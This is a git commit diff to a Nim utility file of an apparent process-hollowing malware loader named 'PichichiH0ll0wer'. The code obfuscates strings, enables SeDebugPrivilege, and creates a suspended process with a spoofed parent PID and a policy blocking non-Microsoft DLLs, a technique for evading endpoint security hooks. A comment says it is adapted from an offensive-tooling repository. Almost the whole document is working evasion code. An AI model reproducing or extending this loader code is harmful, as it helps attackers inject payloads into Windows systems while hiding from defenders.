415edb2d92b309e0722164a700042b1676145e29
Itay Migdal <itaymigdal9@gmail.com>
2023-04-18 22:21:02 +0300

    added createSuspendedExtendedProcess() to utils

--- PichichiH0ll0wer/Loader/utils.nim
+++ PichichiH0ll0wer/Loader/utils.nim
@@ -2,27 +2,6 @@ import winim
 import nimprotect
 
 
-proc setDebugPrivilege*(): bool =
-    # Inits
-    var tp : TOKEN_PRIVILEGES
-    var luid: LUID 
-    var HTtoken: HANDLE
-    var lpszPrivilege = protectString("SeDebugPrivilege")
-    # Open current process token
-    discard OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &HTtoken)
-    # Get current privilege
-    if LookupPrivilegeValue(NULL, lpszPrivilege, &luid) == 0:
-        return false
-    # Enable privilege
-    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
-    tp.PrivilegeCount = 1
-    tp.Privileges[0].Luid = luid
-    # Set privilege
-    if AdjustTokenPrivileges(HTtoken, FALSE, &tp, cast[DWORD](sizeof(TOKEN_PRIVILEGES)), NULL, NULL) == 0:
-        return false
-    # Success
-    return true
-
 
 proc toString*(chars: openArray[WCHAR]): string =
     result = ""
@@ -48,11 +27,34 @@ proc getPid*(pname: string): DWORD =
 
     return 0
 
+
+proc setDebugPrivilege*(): bool =
+    # Inits
+    var tp : TOKEN_PRIVILEGES
+    var luid: LUID 
+    var HTtoken: HANDLE
+    var lpszPrivilege = protectString("SeDebugPrivilege")
+    # Open current process token
+    discard OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &HTtoken)
+    # Get current privilege
+    if LookupPrivilegeValue(NULL, lpszPrivilege, &luid) == 0:
+        return false
+    # Enable privilege
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
+    tp.PrivilegeCount = 1
+    tp.Privileges[0].Luid = luid
+    # Set privilege
+    if AdjustTokenPrivileges(HTtoken, FALSE, &tp, cast[DWORD](sizeof(TOKEN_PRIVILEGES)), NULL, NULL) == 0:
+        return false
+    # Success
+    return true
+
+
 # Heavily stolen from https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/blockdlls_acg_ppid_spoof_bin.nim
-proc createSuspendedExtendedProcess*(processCmd: cstring, parentProcessName: string, isBlockingDlls: bool): ptr PROCESS_INFORMATION =
+proc createSuspendedExtendedProcess*(processCmd: cstring, parentProcessName: string, isBlockDlls: bool): ptr PROCESS_INFORMATION =
 
+    # Some varaibles
     const PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x00000001 shl 44
-
     var si: STARTUPINFOEX
     var pi: PROCESS_INFORMATION
     var ps: SECURITY_ATTRIBUTES
@@ -61,41 +63,51 @@ proc createSuspendedExtendedProcess*(processCmd: cstring, parentProcessName: str
     var lpSize: SIZE_T
     var res: WINBOOL
 
+    # Block all non microsoft DLL's policy in new process
+    policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
+    
+    # Init structs sizes and stuff
     si.StartupInfo.cb = sizeof(si).cint
     ps.nLength = sizeof(ps).cint
     ts.nLength = sizeof(ts).cint
-
     InitializeProcThreadAttributeList(NULL, 2, 0, addr lpSize)
-
     si.lpAttributeList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](HeapAlloc(GetProcessHeap(), 0, lpSize))
-
     InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, addr lpSize)
 
-    policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
+    # If isBlockDlls - update policy
+    if isBlockDlls:
+        if UpdateProcThreadAttribute(
+            si.lpAttributeList,
+            0,
+            cast[DWORD_PTR](PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY),
+            addr policy,
+            sizeof(policy),
+            NULL,
+            NULL
+        ) != TRUE:
+            when not defined(release): echo "[-] Could not update process attribute to block Dlls"
+            quit()
 
-    res = UpdateProcThreadAttribute(
-        si.lpAttributeList,
-        0,
-        cast[DWORD_PTR](PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY),
-        addr policy,
-        sizeof(policy),
-        NULL,
-        NULL
-    )
+    # If parentProcessName supplied - get handle to spoofed PPID and update attribute
+    if parentProcessName != "":
+        var parentProcessId = getPid(parentProcessName)
+        var parentProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, parentProcessId)
+        if parentProcessHandle == 0:
+            when not defined(release): echo "[-] Could not get handle to spoofed parent process"
+            quit()
+        if UpdateProcThreadAttribute(
+            si.lpAttributeList,
+            0,
+            cast[DWORD_PTR](PROC_THREAD_ATTRIBUTE_PARENT_PROCESS),
+            addr parentProcessHandle,
+            sizeof(parentProcessHandle),
+            NULL,
+            NULL
+        ) != TRUE:
+            when not defined(release): echo "[-] Could not update process attribute to block Dlls"
+            quit()
 
-    var parentProcessId = getPid(parentProcessName)
-    var parentProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, parentProcessId)
-
-    res = UpdateProcThreadAttribute(
-        si.lpAttributeList,
-        0,
-        cast[DWORD_PTR](PROC_THREAD_ATTRIBUTE_PARENT_PROCESS),
-        addr parentProcessHandle,
-        sizeof(parentProcessHandle),
-        NULL,
-        NULL
-    )
-
+    # Create the suspended process
     res = CreateProcess(
         NULL,
         newWideCString(processCmd),
@@ -109,4 +121,5 @@ proc createSuspendedExtendedProcess*(processCmd: cstring, parentProcessName: str
         addr pi
     )
 
-discard createSuspendedExtendedProcess("c:\\windows\\system32\\cmd.exe", "nimsuggest.exe", true)
+    # Return updated process information
+    return addr pi
